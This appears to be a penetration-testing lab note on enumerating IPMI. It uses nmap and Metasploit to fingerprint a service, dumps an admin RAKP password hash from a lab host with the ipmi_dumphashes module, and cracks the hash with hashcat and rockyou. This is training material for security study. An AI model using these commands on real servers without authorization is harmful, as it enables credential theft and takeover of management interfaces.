#Footprinting 

---
- To enumerate **IPMI** we use the following command:
```bash
sudo nmap -sU --script ipmi-version -p 623 {IP/Domain}
```
**Note**: We can also use **Metasploit** as follows:

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Lab

- Used the following **msfconsole** to get the hash:
```
[msf](Jobs:0 Agents:0) >> search ipmi

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank    Check  Description
   -  ----                                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_cipher_zero                 2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1  auxiliary/scanner/ipmi/ipmi_dumphashes                  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2  auxiliary/scanner/ipmi/ipmi_version                                      normal  No     IPMI Information Discovery
   3  exploit/multi/upnp/libupnp_ssdp_overflow                2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4  auxiliary/scanner/http/smt_ipmi_cgi_scanner             2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   5  auxiliary/scanner/http/smt_ipmi_49152_exposure          2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   6  auxiliary/scanner/http/smt_ipmi_static_cert_scanner     2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   7  exploit/linux/http/smt_ipmi_close_window_bof            2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   8  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal  2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal


Interact with a module by name or index. For example info 8, use 8 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal

[msf](Jobs:0 Agents:0) >> use 1
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                      Required  Description
   ----                  ---------------                                      --------  -----------
   CRACK_COMMON          true                                                 yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                        no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                           no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi  yes       File containing common passwords for offline cracking, one per line
                         _passwords.txt
   RHOSTS                                                                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
                                                                                        it.html
   RPORT                 623                                                  yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                    yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                    yes       Delay between session retries in seconds
   THREADS               1                                                    yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi  yes       File containing usernames, one per line
                         _users.txt


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set rhosts 10.129.98.46
rhosts => 10.129.98.46
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> exploit

[+] 10.129.98.46:623 - IPMI - Hash found: admin:608639d7820000009922578fabe4b99ce6abb2784c0e997a678ad907af49fdfbf5b92b6b3e4fed85a123456789abcdefa123456789abcdef140561646d696e:1002a67dc12863914ce302979fe63e011d2c9135
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- After finding the hash + salt(`608639d7820000009922578fabe4b99ce6abb2784c0e997a678ad907af49fdfbf5b92b6b3e4fed85a123456789abcdefa123456789abcdef140561646d696e:1002a67dc12863914ce302979fe63e011d2c9135`), we can bruteforce it as follows:
```bash
hashcat -m 7300 hash.txt /usr/share/wordlists/rockyou.txt
```

